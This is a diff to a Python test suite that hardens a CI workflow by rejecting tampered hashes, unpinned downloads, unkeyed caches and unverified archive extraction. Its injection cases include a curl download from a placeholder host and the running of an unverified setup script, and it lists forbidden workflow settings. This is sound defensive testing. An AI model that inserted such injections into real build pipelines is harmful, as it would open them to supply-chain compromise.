@@ -228,8 +228,28 @@ def test_peer_validation_cannot_be_disabled(checkout):
         ),
         (
             ".github/workflows/foundation.yml",
-            "f4b1bfb3c79b5bb11b8d228a12504163b4c0dab4d679828d8f5f26b6cb6ab35d",
+            "d6f5f504043400592e9dcf368ba262c64d998608646cc22281b5a75beecbc872",
             "0" * 64,
+        ),
+        (
+            ".github/workflows/foundation.yml",
+            "releases/download/3.13.16-36805956071/python-3.13.16-linux-24.04-x64.tar.gz",
+            "releases/download/3.13.16-latest/python-3.13.16-linux-24.04-x64.tar.gz",
+        ),
+        (
+            ".github/workflows/foundation.yml",
+            "foundation-ubuntu24-x64-python3.13.16-pip26.2.2-${{ hashFiles('requirements.lock') }}",
+            "foundation-python-unkeyed",
+        ),
+        (
+            ".github/workflows/foundation.yml",
+            'export LD_LIBRARY_PATH="$RUNNER_TEMP/python-3.13.16/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"',
+            'export LD_LIBRARY_PATH="/tmp/unverified"',
+        ),
+        (
+            ".github/workflows/foundation.yml",
+            "foundation-ubuntu24-x64-node24.22.1-pnpm10.34.7-${{ hashFiles('pnpm-lock.yaml') }}",
+            "foundation-pnpm-unkeyed",
         ),
         (
             ".github/workflows/foundation.yml",
@@ -285,14 +305,30 @@ def test_ci_tool_and_installer_drift_is_rejected_before_install(
     assert filename + " executable input drift" in completed.stdout + completed.stderr
 
 
-def test_ci_archive_must_be_verified_before_extraction(checkout):
+@pytest.mark.parametrize(
+    ("hash_line", "extract_line"),
+    [
+        (
+            (
+                'echo "6896f9e3a6b0a354bf470835a96da76d2f801cd50dcf047ad7c4563bf93bf431'
+                '  $RUNNER_TEMP/pwsh.tar.gz" | sha256sum -c -'
+            ),
+            'tar -xzf "$RUNNER_TEMP/pwsh.tar.gz" -C "$RUNNER_TEMP/pwsh"',
+        ),
+        (
+            (
+                'echo "d6f5f504043400592e9dcf368ba262c64d998608646cc22281b5a75beecbc872'
+                '  $archive" | sha256sum -c -'
+            ),
+            'tar -xzf "$archive" -C "$RUNNER_TEMP/python-3.13.16"',
+        ),
+    ],
+)
+def test_ci_archive_must_be_verified_before_extraction(
+    checkout, hash_line, extract_line
+):
     workflow = checkout / ".github/workflows/foundation.yml"
     content = workflow.read_text()
-    hash_line = (
-        'echo "6896f9e3a6b0a354bf470835a96da76d2f801cd50dcf047ad7c4563bf93bf431'
-        '  $RUNNER_TEMP/pwsh.tar.gz" | sha256sum -c -'
-    )
-    extract_line = 'tar -xzf "$RUNNER_TEMP/pwsh.tar.gz" -C "$RUNNER_TEMP/pwsh"'
     assert hash_line in content and extract_line in content
     workflow.write_text(
         content.replace(hash_line, "ARCHIVE_HASH_PLACEHOLDER", 1)
@@ -310,7 +346,7 @@ def test_commented_checkout_pin_cannot_hide_unapproved_action(checkout):
     workflow = checkout / ".github/workflows/foundation.yml"
     content = workflow.read_text()
     approved = "- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-    assert content.count(approved) == 2
+    assert content.count(approved) == 3
     workflow.write_text(
         content.replace(approved, "- uses : actions/checkout@main", 1)
         + "\n# "
@@ -324,6 +360,37 @@ def test_commented_checkout_pin_cannot_hide_unapproved_action(checkout):
     )
 
 
+def test_node24_artifacts_are_immutable_and_integrity_errors_are_fatal():
+    workflow = (ROOT / ".github/workflows/foundation.yml").read_text()
+    assert (
+        "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9" in workflow
+    )
+    assert (
+        "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333" in workflow
+    )
+    for required in (
+        "archive: true",
+        "overwrite: false",
+        "include-hidden-files: false",
+        "if-no-files-found: error",
+        "merge-multiple: false",
+        "digest-mismatch: error",
+        "if: ${{ always() }}",
+        "|| 'Full Foundation acceptance'",
+    ):
+        assert required in workflow
+    for forbidden in (
+        "continue-on-error:",
+        "ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION",
+        "FORCE_JAVASCRIPT_ACTIONS_TO_NODE24",
+        "retention-days: 1",
+        "pull_request_target:",
+        "workflow_run:",
+        "artifact@v",
+    ):
+        assert forbidden not in workflow
+
+
 @pytest.mark.parametrize(
     ("filename", "needle", "injection"),
     [
@@ -331,6 +398,11 @@ def test_commented_checkout_pin_cannot_hide_unapproved_action(checkout):
             ".github/workflows/foundation.yml",
             'tar -xzf "$RUNNER_TEMP/pwsh.tar.gz" -C "$RUNNER_TEMP/pwsh"',
             'command curl -fsSL -o "$RUNNER_TEMP/pwsh.tar.gz" https://example.invalid/bad',
+        ),
+        (
+            ".github/workflows/foundation.yml",
+            'tar -xzf "$archive" -C "$RUNNER_TEMP/python-3.13.16"',
+            'bash "$RUNNER_TEMP/python-3.13.16/setup.sh"',
         ),
         (
             ".github/workflows/foundation.yml",
